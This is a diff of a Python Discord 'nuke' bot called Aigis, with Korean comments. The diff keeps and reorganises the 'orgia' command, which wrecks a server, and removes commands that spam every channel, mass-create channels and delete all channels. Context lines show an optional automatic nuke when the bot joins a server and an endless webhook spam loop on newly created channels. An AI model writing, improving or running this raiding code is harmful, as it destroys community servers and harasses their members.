@@ -1,3 +1,5 @@
+#머리
+
 import discord, random, aiohttp, asyncio
 from discord.ext import commands
 from discord import Webhook, AsyncWebhookAdapter
@@ -13,6 +15,10 @@ webhook_usernames = ["makoto", "aigis 2", "aigis 1"]
 nuke_on_join = False
 nuke_wait_time = 0
 
+
+#
+
+#봇 상태설정
 @client.event
 async def on_ready():
 
@@ -26,6 +32,7 @@ async def on_ready():
   
   print("Aigis:",client.user.name,"819929289759653928:",client.user.id)
 
+#갠디로 엠베드 전송
 @client.command()
 async def aigis(ctx):
   await ctx.message.delete()
@@ -41,15 +48,6 @@ Shows this message.
 {prefix}orgia
 Nukes the server. 
  
-{prefix}sall <message>
-Spams all the channels.
- 
-{prefix}ccr <channel count> <channel name>
-Creates channels with the given name.
- 
-{prefix}rank
-Deletes all channels.
- 
 {prefix}overheat
 Logs out the client.
 ```
@@ -59,7 +57,13 @@ asdf
 ```
 """)
   await author.send(embed = cmds)
-  
+
+#여기서부터 다음 설명까지 orgia 커맨드 범위
+@client.command()
+async def orgia(ctx):
+  await ctx.message.delete()
+  guild = ctx.guild
+  await nuke(guild)
   
 async def nuke(guild):
   print(f"{C.WHITE}Nuking {guild.name}.")
@@ -85,13 +89,9 @@ async def nuke(guild):
     await guild.create_text_channel(random.choice(channel_names))
   print(f"{C.GREEN}Nuked {guild.name}.")
   
-@client.command()
-async def orgia(ctx):
-  await ctx.message.delete()
-  guild = ctx.guild
-  await nuke(guild)
+
   
-@bot.event
+@client.event
 async def on_guild_join(guild):
   if nuke_on_join == True:
     await asyncio.sleep(nuke_wait_time)
@@ -99,56 +99,6 @@ async def on_guild_join(guild):
   else:
     return
   
-@client.command()
-async def sall(ctx, *, message = None):
-  if message == None:
-    for channel in ctx.guild.channels:
-      try:
-        await channel.send(random.choice(spam_messages))
-      except discord.Forbidden:
-        print(f"{C.RED}Spam Error {C.WHITE}[Cannot send messages]")
-        return
-      except:
-        pass
-  else:
-    for channel in ctx.guild.channels:
-      try:
-        await channel.send(message)
-      except discord.Forbidden:
-        print(f"{C.RED}Sall Error {C.WHITE}[Cannot send messages]")
-        return
-      except:
-        pass
-
-@client.command()
-async def ccr(ctx, amount = 10, *, name = None):
-  if name == None:
-    for i in range(amount):
-      try:
-        await ctx.guild.create_text_channel(random.choice(channel_names))
-      except discord.Forbidden:
-        print(f"{C.RED}Ccr Error {C.WHITE}[Cannot create channel]")
-        return
-      except:
-        pass
-  else:
-    for i in range(amount):
-      try:
-        await ctx.guild.create_text_channel(name)
-      except discord.Forbidden:
-        print(f"{C.RED}Ccr Error {C.WHITE}[Cannot create channel]")
-        return
-      except:
-        pass
-
-@client.command()
-async def rank(ctx):
-  for channel in ctx.guild.channels:
-    try:
-      await channel.delete()
-      print(f"{C.GREEN}Successfully deleted channel {C.WHITE}{channel.name}")
-    except:
-      print(f"{C.RED}Channel {C.WHITE}{channel.name} {C.RED}has NOT been deleted.")
 
 @client.event
 async def on_guild_channel_create(channel):
@@ -159,6 +109,7 @@ async def on_guild_channel_create(channel):
     while True:
       await webhook.send(random.choice(spam_messages), username = random.choice(webhook_usernames))
 
+#서버퇴장
 @client.command()
 async def overheat(ctx):
   await ctx.message.delete()
@@ -166,10 +117,5 @@ async def overheat(ctx):
   
   
   
-  
-  
-  
-  
-  
-  
+#끝
 client.run(os.environ['token'])
